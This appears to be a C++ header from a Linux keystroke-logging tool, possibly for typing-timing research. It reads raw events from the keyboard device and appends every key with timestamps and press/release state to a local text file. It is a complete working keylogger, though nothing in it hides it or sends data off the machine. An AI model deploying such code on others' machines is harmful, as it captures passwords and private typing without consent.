#ifndef LOGKEYSTROKE_H
#define LOGKEYSTROKE_H

#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <cstdio>
#include <iostream>
#include <string>

#include "keyDataLinux.h"
#include "logKeystroke.h"

using namespace std;

FILE *fp;
static int SESSION_TRACKER;  // Keeps track of session

void log_data(const char *filename, char *lineToPrint) {
  // Open file, account for different situations
  try {
    if (SESSION_TRACKER > 0) {
      SESSION_TRACKER = 1;
      fp = fopen(filename, "a");
    } else {
      SESSION_TRACKER++;
      fp = fopen(filename, "w");
    }
  } catch (const std::exception &e) {
    SESSION_TRACKER = 1;
    fp = fopen(filename, "w");
  }

  fprintf(fp, "%s", lineToPrint);
  fclose(fp);
}

int testPrint() {
  std::cout << "This is a test to get to the file.\n";
  return 0;
}

int runKDProcess(pid_t parentPID) {
  // Get and read Linux keyboard, stop otherwise
  const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";

  SESSION_TRACKER = 0;

  ssize_t n;
  int fd;
  fd = open(dev, O_RDONLY);
  if (fd == -1) {
    printf("Error getting keyboard");
    return EXIT_FAILURE;
  }

  // Define standard components
  struct input_event ev;

  char *phrase = (char *)malloc(2500);
  int lastChar;

  // While parent process is alive
  while (getppid() == parentPID) {
    // if (ev.code != KEY_ENTER) {
    //  Read key and error check
    n = read(fd, &ev, sizeof ev);
    if (n == (ssize_t)-1) {
      if (errno == EINTR)
        continue;
      else
        break;
    } else if (n != sizeof ev) {
      errno = EIO;
      break;
    }

    // if last 2 keys are ";\n", reset file, else save
    if ((lastChar == KEY_SEMICOLON) && (ev.code == KEY_ENTER)) {
      SESSION_TRACKER = 0;
      continue;
    } else {
      lastChar = ev.code;
    }

    // If key is pressed
    if (ev.type == EV_KEY) {
      // Get keystroke data (time, letter, pressed v. released), and put in
      // string to be logged
      time_t seconds;
      seconds = time(NULL);

      // Concat string to add to entrance
      sprintf(phrase, "%ld - %ld - %s - %s\n", seconds, ev.time.tv_usec,
              getKeyboardLetter(ev.code).c_str(), keyPressed(ev.value).c_str());
      const std::string filename = "/usr/local/src/rawKeyData.txt";
      log_data(filename.c_str(), phrase);
    }
    //}
  }

  // Clear memory
  close(fd);
  fflush(stdout);
  exit(0);
  return EXIT_FAILURE;
}

#endif